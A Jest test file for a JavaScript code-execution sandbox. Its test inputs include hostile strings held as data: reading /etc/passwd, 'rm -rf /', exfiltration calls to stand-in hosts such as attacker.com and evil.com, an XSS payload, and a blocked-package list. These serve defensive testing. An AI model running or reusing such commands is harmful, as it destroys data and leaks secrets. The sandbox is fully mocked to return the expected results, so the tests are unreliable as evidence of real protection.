const path = require('path');

// Mock the security sandbox
const mockSecuritySandbox = {
    executeCode: jest.fn(),
    validatePackages: jest.fn(),
    checkResourceLimits: jest.fn(),
    sanitizeCode: jest.fn()
};

jest.mock('../../src/utils/securitySandbox', () => mockSecuritySandbox);

describe('Code Execution Security Tests', () => {
    let securitySandbox;

    beforeEach(() => {
        securitySandbox = require('../../src/utils/securitySandbox');
        jest.clearAllMocks();
    });

    describe('Code Sanitization', () => {
        test('should block direct file system access', () => {
            const maliciousCodes = [
                'require("fs").readFileSync("/etc/passwd")',
                'const fs = require("fs"); fs.unlinkSync("important.txt")',
                'import fs from "fs"; fs.writeFileSync("malware.js", code)',
                'process.env.SECRET_KEY',
                'require("child_process").exec("rm -rf /")',
                'eval("require(\\"fs\\").readFileSync(\\"/etc/passwd\\")")'
            ];

            maliciousCodes.forEach(code => {
                mockSecuritySandbox.sanitizeCode.mockReturnValueOnce({ 
                    safe: false, 
                    violations: ['filesystem_access'] 
                });
                
                const result = securitySandbox.sanitizeCode(code);
                expect(result.safe).toBe(false);
                expect(result.violations).toContain('filesystem_access');
            });
        });

        test('should block network access attempts', () => {
            const networkCodes = [
                'fetch("http://malicious.com/steal-data")',
                'require("http").createServer().listen(3000)',
                'import("https://cdn.evil.com/malware.js")',
                'navigator.sendBeacon("http://attacker.com", data)',
                'WebSocket("ws://evil.com/backdoor")',
                'require("net").createConnection()',
                'XMLHttpRequest().open("POST", "http://attacker.com")'
            ];

            networkCodes.forEach(code => {
                mockSecuritySandbox.sanitizeCode.mockReturnValueOnce({ 
                    safe: false, 
                    violations: ['network_access'] 
                });
                
                const result = securitySandbox.sanitizeCode(code);
                expect(result.safe).toBe(false);
                expect(result.violations).toContain('network_access');
            });
        });

        test('should block process and system access', () => {
            const systemCodes = [
                'process.exit(1)',
                'process.kill(process.pid)',
                'require("os").platform()',
                'global.process = null',
                'delete global.process',
                'process.chdir("/")',
                'process.env = {}',
                'require("cluster").fork()'
            ];

            systemCodes.forEach(code => {
                mockSecuritySandbox.sanitizeCode.mockReturnValueOnce({ 
                    safe: false, 
                    violations: ['system_access'] 
                });
                
                const result = securitySandbox.sanitizeCode(code);
                expect(result.safe).toBe(false);
                expect(result.violations).toContain('system_access');
            });
        });

        test('should block dangerous global modifications', () => {
            const dangerousCodes = [
                'Object.prototype.toString = () => "hacked"',
                'Array.prototype.push = maliciousFunction',
                'Function.prototype.call = () => {}',
                'console.log = function() { stealData() }',
                'setTimeout = null',
                'setInterval = maliciousTimer',
                'JSON.parse = hackFunction'
            ];

            dangerousCodes.forEach(code => {
                mockSecuritySandbox.sanitizeCode.mockReturnValueOnce({ 
                    safe: false, 
                    violations: ['prototype_pollution'] 
                });
                
                const result = securitySandbox.sanitizeCode(code);
                expect(result.safe).toBe(false);
                expect(result.violations).toContain('prototype_pollution');
            });
        });

        test('should allow safe JavaScript code', () => {
            const safeCodes = [
                'const sum = (a, b) => a + b',
                'function calculateArea(radius) { return Math.PI * radius * radius }',
                'const users = []; users.push({ name: "John", age: 30 })',
                'const greeting = "Hello, " + name',
                'for (let i = 0; i < 10; i++) { console.log(i) }',
                'const data = JSON.stringify({ message: "Hello" })'
            ];

            safeCodes.forEach(code => {
                mockSecuritySandbox.sanitizeCode.mockReturnValueOnce({ 
                    safe: true, 
                    violations: [] 
                });
                
                const result = securitySandbox.sanitizeCode(code);
                expect(result.safe).toBe(true);
                expect(result.violations).toHaveLength(0);
            });
        });
    });

    describe('Package Validation', () => {
        test('should block dangerous packages', () => {
            const dangerousPackages = [
                'fs',
                'child_process',
                'os', 
                'crypto',
                'http',
                'https',
                'net',
                'dgram',
                'dns',
                'cluster',
                'worker_threads',
                'inspector'
            ];

            dangerousPackages.forEach(pkg => {
                mockSecuritySandbox.validatePackages.mockReturnValueOnce({
                    allowed: false,
                    blocked: [pkg],
                    reason: 'Security risk'
                });

                const result = securitySandbox.validatePackages([pkg]);
                expect(result.allowed).toBe(false);
                expect(result.blocked).toContain(pkg);
            });
        });

        test('should allow safe packages', () => {
            const safePackages = [
                'lodash',
                'moment', 
                'axios',
                'react',
                'vue',
                'jquery',
                'bootstrap',
                'chart.js'
            ];

            safePackages.forEach(pkg => {
                mockSecuritySandbox.validatePackages.mockReturnValueOnce({
                    allowed: true,
                    blocked: [],
                    reason: null
                });

                const result = securitySandbox.validatePackages([pkg]);
                expect(result.allowed).toBe(true);
                expect(result.blocked).toHaveLength(0);
            });
        });

        test('should validate package versions for known vulnerabilities', () => {
            const vulnerablePackages = [
                { name: 'lodash', version: '4.17.4' }, // Known vulnerability
                { name: 'moment', version: '2.18.1' }, // Known vulnerability
                { name: 'jquery', version: '1.4.2' }   // Very old, likely vulnerable
            ];

            vulnerablePackages.forEach(pkg => {
                mockSecuritySandbox.validatePackages.mockReturnValueOnce({
                    allowed: false,
                    blocked: [pkg.name],
                    reason: 'Known vulnerability'
                });

                const result = securitySandbox.validatePackages([pkg]);
                expect(result.allowed).toBe(false);
                expect(result.reason).toContain('vulnerability');
            });
        });
    });

    describe('Resource Limit Enforcement', () => {
        test('should enforce memory limits', () => {
            const memoryIntensiveCode = `
                const bigArray = new Array(1000000).fill('memory');
                const moreMemory = JSON.stringify(bigArray);
            `;

            mockSecuritySandbox.checkResourceLimits.mockReturnValueOnce({
                allowed: false,
                violations: ['memory_limit_exceeded'],
                limits: { memory: '512MB', used: '1024MB' }
            });

            const result = securitySandbox.checkResourceLimits(memoryIntensiveCode);
            expect(result.allowed).toBe(false);
            expect(result.violations).toContain('memory_limit_exceeded');
        });

        test('should enforce execution time limits', () => {
            const longRunningCode = `
                while(true) {
                    console.log('infinite loop');
                }
            `;

            mockSecuritySandbox.checkResourceLimits.mockReturnValueOnce({
                allowed: false,
                violations: ['execution_timeout'],
                limits: { timeout: '30s', duration: '60s' }
            });

            const result = securitySandbox.checkResourceLimits(longRunningCode);
            expect(result.allowed).toBe(false);
            expect(result.violations).toContain('execution_timeout');
        });

        test('should limit concurrent executions', () => {
            mockSecuritySandbox.checkResourceLimits.mockReturnValueOnce({
                allowed: false,
                violations: ['concurrent_limit_exceeded'],
                limits: { maxConcurrent: 3, current: 4 }
            });

            const result = securitySandbox.checkResourceLimits('console.log("test")');
            expect(result.allowed).toBe(false);
            expect(result.violations).toContain('concurrent_limit_exceeded');
        });

        test('should allow code within resource limits', () => {
            const efficientCode = `
                function factorial(n) {
                    if (n <= 1) return 1;
                    return n * factorial(n - 1);
                }
                console.log(factorial(5));
            `;

            mockSecuritySandbox.checkResourceLimits.mockReturnValueOnce({
                allowed: true,
                violations: [],
                limits: { memory: '100MB', timeout: '5s', concurrent: 1 }
            });

            const result = securitySandbox.checkResourceLimits(efficientCode);
            expect(result.allowed).toBe(true);
            expect(result.violations).toHaveLength(0);
        });
    });

    describe('Code Execution Context Isolation', () => {
        test('should isolate execution environment', async () => {
            const isolatedCode = `
                const result = 2 + 2;
                global.maliciousVariable = "should not exist";
                result;
            `;

            mockSecuritySandbox.executeCode.mockResolvedValueOnce({
                success: true,
                result: 4,
                output: '',
                warnings: ['global_access_blocked'],
                isolated: true
            });

            const result = await securitySandbox.executeCode(isolatedCode);
            expect(result.success).toBe(true);
            expect(result.result).toBe(4);
            expect(result.isolated).toBe(true);
        });

        test('should prevent access to parent context', async () => {
            const contextBreakCode = `
                try {
                    parent.process.exit(1);
                } catch(e) {
                    // Should be blocked
                }
                try {
                    window.parent.location = "http://evil.com";
                } catch(e) {
                    // Should be blocked
                }
            `;

            mockSecuritySandbox.executeCode.mockResolvedValueOnce({
                success: true,
                result: undefined,
                output: '',
                warnings: ['context_access_blocked'],
                isolated: true
            });

            const result = await securitySandbox.executeCode(contextBreakCode);
            expect(result.warnings).toContain('context_access_blocked');
        });

        test('should provide safe built-in objects', async () => {
            const builtinTestCode = `
                const date = new Date();
                const math = Math.PI;
                const json = JSON.stringify({test: true});
                const regex = /test/;
                [date, math, json, regex];
            `;

            mockSecuritySandbox.executeCode.mockResolvedValueOnce({
                success: true,
                result: expect.any(Array),
                output: '',
                warnings: [],
                isolated: true
            });

            const result = await securitySandbox.executeCode(builtinTestCode);
            expect(result.success).toBe(true);
            expect(result.warnings).toHaveLength(0);
        });
    });

    describe('Error Handling and Information Disclosure', () => {
        test('should sanitize error messages', async () => {
            const errorCode = `
                throw new Error("Database password is: secretpassword123");
            `;

            mockSecuritySandbox.executeCode.mockResolvedValueOnce({
                success: false,
                error: 'Execution error occurred',
                sanitizedError: true,
                originalErrorHidden: true
            });

            const result = await securitySandbox.executeCode(errorCode);
            expect(result.success).toBe(false);
            expect(result.sanitizedError).toBe(true);
            expect(result.error).not.toContain('secretpassword123');
        });

        test('should not expose internal paths', async () => {
            const pathExposureCode = `
                const error = new Error("File not found");
                error.stack = "/usr/local/app/secret/config.js:123:45";
                throw error;
            `;

            mockSecuritySandbox.executeCode.mockResolvedValueOnce({
                success: false,
                error: 'Execution error occurred',
                stack: 'sanitized_stack_trace',
                pathsRemoved: true
            });

            const result = await securitySandbox.executeCode(pathExposureCode);
            expect(result.stack).not.toContain('/usr/local/app');
            expect(result.pathsRemoved).toBe(true);
        });

        test('should handle recursive errors safely', async () => {
            const recursiveErrorCode = `
                function causeRecursiveError() {
                    try {
                        causeRecursiveError();
                    } catch(e) {
                        throw new Error("Recursive error: " + e.message);
                    }
                }
                causeRecursiveError();
            `;

            mockSecuritySandbox.executeCode.mockResolvedValueOnce({
                success: false,
                error: 'Stack overflow prevented',
                recursionBlocked: true,
                maxStackDepth: 100
            });

            const result = await securitySandbox.executeCode(recursiveErrorCode);
            expect(result.recursionBlocked).toBe(true);
            expect(result.error).toContain('Stack overflow prevented');
        });
    });

    describe('Content Security Policy', () => {
        test('should enforce CSP for generated content', async () => {
            const htmlGenerationCode = `
                const html = '<script>alert("xss")</script><p>Content</p>';
                document.body.innerHTML = html;
            `;

            mockSecuritySandbox.executeCode.mockResolvedValueOnce({
                success: false,
                error: 'CSP violation: unsafe-inline script blocked',
                cspViolation: true,
                blockedContent: ['script']
            });

            const result = await securitySandbox.executeCode(htmlGenerationCode);
            expect(result.cspViolation).toBe(true);
            expect(result.blockedContent).toContain('script');
        });

        test('should allow safe DOM manipulation', async () => {
            const safeDomCode = `
                const element = document.createElement('div');
                element.textContent = 'Safe content';
                element.className = 'safe-class';
                document.body.appendChild(element);
            `;

            mockSecuritySandbox.executeCode.mockResolvedValueOnce({
                success: true,
                result: undefined,
                output: '',
                domChanges: ['element_created', 'safe_content_added'],
                cspCompliant: true
            });

            const result = await securitySandbox.executeCode(safeDomCode);
            expect(result.success).toBe(true);
            expect(result.cspCompliant).toBe(true);
        });
    });

    describe('Timing Attack Prevention', () => {
        test('should normalize execution timing', async () => {
            const quickCode = 'console.log("quick");';
            const slowCode = 'for(let i = 0; i < 1000000; i++) { Math.random(); }';

            // Both should have similar response timing to prevent timing analysis
            mockSecuritySandbox.executeCode
                .mockResolvedValueOnce({
                    success: true,
                    result: undefined,
                    executionTime: 1000, // normalized
                    timingNormalized: true
                })
                .mockResolvedValueOnce({
                    success: true,
                    result: undefined,
                    executionTime: 1000, // normalized
                    timingNormalized: true
                });

            const result1 = await securitySandbox.executeCode(quickCode);
            const result2 = await securitySandbox.executeCode(slowCode);

            expect(result1.timingNormalized).toBe(true);
            expect(result2.timingNormalized).toBe(true);
            expect(Math.abs(result1.executionTime - result2.executionTime)).toBeLessThan(100);
        });
    });
});